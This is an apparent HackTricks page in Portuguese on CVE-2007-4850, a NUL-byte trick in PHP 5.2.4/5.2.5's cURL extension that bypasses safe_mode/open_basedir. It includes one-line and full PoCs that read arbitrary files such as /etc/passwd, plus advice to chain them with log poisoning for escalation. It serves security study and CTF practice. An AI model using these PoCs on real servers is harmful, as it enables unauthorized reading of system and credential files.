# PHP 5.2.4 and 5.2.5 PHP cURL

{{#include ../../../../banners/hacktricks-training.md}}

Esta página documenta um truque legado, mas ainda útil em CTFs/instalações legadas locais, para contornar as verificações safe_mode/open_basedir do PHP usando a extensão cURL em builds específicos do PHP 5.2.x.

- Afetado: PHP 5.2.4 and 5.2.5 com ext/curl habilitado.
- Impacto: Ler arquivos locais arbitrários apesar das restrições safe_mode ou open_basedir (sem execução direta de código).
- ID: CVE-2007-4850.

Fonte: http://blog.safebuff.com/2016/05/06/disable-functions-bypass/

## One-liner PoC

Se safe_mode ou open_basedir estiverem ativos e cURL estiver habilitado, o seguinte retornará o conteúdo do script atual:
```php
var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00".__FILE__)));
```
## PoC mais explícito (arbitrary file read)
```php
<?php
// Preconditions (legacy): PHP 5.2.4/5.2.5, safe_mode or open_basedir enabled, ext/curl loaded
$target = '/etc/passwd'; // change to the file you want to read
$ch = curl_init();
// The trick is the NUL byte (\x00). Prefix can be any string; checks are confused and the file after the NUL is read.
curl_setopt($ch, CURLOPT_URL, 'file://prefix'.chr(0).$target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$resp = curl_exec($ch);
$err  = curl_error($ch);
curl_close($ch);
if ($resp !== false) {
echo $resp; // should contain the target file
} else {
echo "cURL error: $err\n";
}
?>
```
Notas:
- Use aspas duplas ou chr(0) para injetar um byte NUL real. Percent-encoding (%00) não funciona de forma confiável.
- Isto é uma primitiva de leitura de arquivos. Combine com outras primitivas (log poisoning, session file inclusion, etc.) para escalar privilégios quando possível.

## Por que isso funciona (resumido)

A vulnerabilidade reside em como o PHP 5.2.4/5.2.5 realizava as checagens safe_mode/open_basedir para URLs file:// em ext/curl. A verificação fazia o parse da URL e validava um componente de caminho, mas devido ao tratamento de NUL-byte ela validava uma string diferente daquela realmente usada pelo libcurl. Na prática, o validador podia aprovar o caminho após o NUL enquanto o libcurl usava a parte antes do NUL como o contêiner da URL, permitindo um bypass que resulta na leitura do arquivo colocado após o byte NUL. Veja a análise original e a macro afetada em curl/interface.c para detalhes. [CVE-2007-4850].

## Restrições e correções

- Corrigido em versões posteriores 5.2.x (por exemplo, builds de distro corrigidos para 5.2.6) ao consertar o parsing/validação em ext/curl.
- Afeta apenas deploys muito antigos de PHP; safe_mode foi removido no PHP 5.4 e builds modernos não apresentam esse comportamento.

## Veja também

Outros bypasses de disable_functions/open_basedir e técnicas modernas estão coletados aqui:

{{#ref}}
README.md
{{#endref}}



## Referências

- Entrada CVE da Ubuntu com ponteiros de patch e versões afetadas: https://ubuntu.com/security/CVE-2007-4850
- Análise técnica com contexto de código (cxsecurity): http://cxsecurity.com/issue/WLB-2008010060
{{#include ../../../../banners/hacktricks-training.md}}
